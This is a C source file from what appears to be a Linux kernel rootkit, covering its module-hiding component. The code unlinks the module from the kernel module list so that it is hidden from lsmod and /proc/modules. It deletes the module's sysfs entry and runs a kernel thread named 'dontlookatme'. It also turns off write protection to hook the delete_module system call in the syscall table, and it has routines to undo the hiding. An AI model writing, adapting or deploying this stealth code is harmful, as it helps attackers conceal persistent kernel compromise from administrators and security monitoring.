#include "code_hiding.h"
#include "hooking.h"
#include<linux/sysfs.h>
#include <../../fs/sysfs/sysfs.h>

//struct sysfs_dirent {
//  atomic_t                s_count;
//  atomic_t                s_active;
//#ifdef CONFIG_DEBUG_LOCK_ALLOC
//  struct lockdep_map      dep_map;
//#endif
//  struct sysfs_dirent     *s_parent;
//  const char              *s_name;
//  struct rb_node          s_rb;
//  union {
//    struct completion       *completion;
//    struct sysfs_dirent     *removed_list;
//  } u;
//
//  const void              *s_ns; /* namespace tag */
//  unsigned int            s_hash; /* ns + name hash */
//  union {
//    struct sysfs_elem_dir           s_dir;
//    struct sysfs_elem_symlink       s_symlink;
//    struct sysfs_elem_attr          s_attr;
//    struct sysfs_elem_bin_attr      s_bin_attr;
//  };
//
//  unsigned short          s_flags;
//  umode_t                 s_mode;
//  unsigned int            s_ino;
//  struct sysfs_inode_attrs *s_iattr;
//};
static struct list_head * tmp_head;
static struct kobject * tmp_kobj;
static struct kobject * tmp_parent;
static struct sysfs_dirent * tmp_sd;
static struct module_sect_attrs * tmp_sect;
static struct module_notes_attrs * tmp_notes;
static struct task_struct * default_waiter;

static int (*orig_sys_delete_module)(const char * name, int flags);
static int my_delete_module(const char * name, int flags){
  //if(strcmp(name, "rootkit") == 0){  //TODO: replace string with macro
  //  printk(KERN_INFO "rootkit wants back to it's own kind\n");
  //  mutex_lock(&module_mutex);
  //  list_add(&THIS_MODULE->list, tmp_head);
  //  mutex_unlock(&module_mutex);
  //}
  return orig_sys_delete_module(name, flags);
}

static inline void tidy(void)
{
  tmp_sect = THIS_MODULE->sect_attrs;
  tmp_notes = THIS_MODULE->notes_attrs;
  //kfree(THIS_MODULE->notes_attrs);
  THIS_MODULE->notes_attrs = NULL;
  //kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;

  //kfree(THIS_MODULE->mkobj.mp);
  //THIS_MODULE->mkobj.mp = NULL;
  //THIS_MODULE->modinfo_attrs->attr.name = NULL;
  //kfree(THIS_MODULE->mkobj.drivers_dir);
  //THIS_MODULE->mkobj.drivers_dir = NULL;
}

static int hiding_thread(void * data){
  int check = 0;
  mutex_lock(&module_mutex);
  printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");

  disable_wp();
  orig_sys_delete_module = syscall_table[__NR_delete_module];
  syscall_table[__NR_delete_module] = my_delete_module;
  enable_wp();

  //printk(KERN_INFO "module is live? %d\n", module_is_live(THIS_MODULE));
  //printk(KERN_INFO "module removable, task state: %ld\n", THIS_MODULE->waiter->state);

  tmp_head = THIS_MODULE->list.prev;	
  list_del(&THIS_MODULE->list);//lsmod,/proc/modules

  tmp_kobj = &THIS_MODULE->mkobj.kobj;
  tmp_parent = tmp_kobj->parent;
  //check = kobject_move(tmp_kobj, NULL);// /sys/modules
 // if(!tmp_kobj){
 //   printk(KERN_INFO "etwas stimmt nicht\n");
 //   return 0;
 // }
 // sysfs_remove_dir(tmp_kobj);
 // tmp_kobj->state_in_sysfs=0;
 // kobject_put(tmp_parent);
 // tmp_kobj->parent = NULL;

  //kobject_del(tmp_kobj);// /sys/modules
  //tmp_sd = tmp_kobj->sd;
  //tmp_sd = sysfs_new_dirent(tmp_kobj->sd->s_name, tmp_kobj->sd->s_mode, tmp_kobj->sd->s_flags);
  tmp_sd = (struct sysfs_dirent *)kmalloc(sizeof(struct sysfs_dirent), GFP_KERNEL);
  memcpy(tmp_sd, tmp_kobj->sd, sizeof(struct sysfs_dirent));
  printk(KERN_INFO "kobject name: %s'n", tmp_kobj->name);
  printk(KERN_INFO "kobject name: %s'n", tmp_kobj->name);
  kobject_del(&THIS_MODULE->mkobj.kobj);// /sys/modules
  printk(KERN_INFO "kobject name: %s'n", tmp_kobj->name);
  printk(KERN_INFO "name: %s\n", tmp_sd->s_name);
  printk(KERN_INFO "parent name: %s\n", tmp_sd->s_parent->s_name);

  //THIS_MODULE->sect_attrs = NULL;
  //THIS_MODULE->notes_attrs = NULL;

  //default_waiter = THIS_MODULE->waiter;
  //tidy();
  mutex_unlock(&module_mutex);
  return 0;
}


void hide_code(void){
  kthread_run(hiding_thread, NULL, "dontlookatme");
}

int make_module_removable(void * data){
  int error = 0;
  mutex_lock(&module_mutex);
  //error = kobject_move(tmp_kobj, tmp_parent);// /sys/modules
	//THIS_MODULE->mkobj.kobj = &tmp_kobj;
  //THIS_MODULE->sect_attrs = tmp_sect;
  //THIS_MODULE->notes_attrs = tmp_notes;
	tmp_kobj->sd = tmp_sd;
  error = kobject_add(tmp_kobj, tmp_parent, tmp_kobj->name);
  printk(KERN_INFO "module removable, error: %d\n", module_refcount(THIS_MODULE));
  //kobject_put(tmp_kobj);
  //kobject_put(tmp_kobj);
  list_add(&THIS_MODULE->list, tmp_head);
  //printk(KERN_INFO "module is live? %d\n", module_is_live(THIS_MODULE));
  //printk(KERN_INFO "module removable, task state: %ld\n", THIS_MODULE->waiter->state);
  //THIS_MODULE->waiter = default_waiter;
  mutex_unlock(&module_mutex);
  printk(KERN_INFO "module removable, task state after that: %ld\n", THIS_MODULE->waiter->state);
  
  return 0;
}

int unhide_code(void * data) {
  disable_wp();
  syscall_table[__NR_delete_module] = orig_sys_delete_module;
  enable_wp();
  //printk(KERN_INFO "rootkit wants back to it's own kind\n");
  //mutex_lock(&module_mutex);
  //make_module_removable();
  //list_add(&THIS_MODULE->list, tmp_head);
  //mutex_unlock(&module_mutex);
  return 0;
}

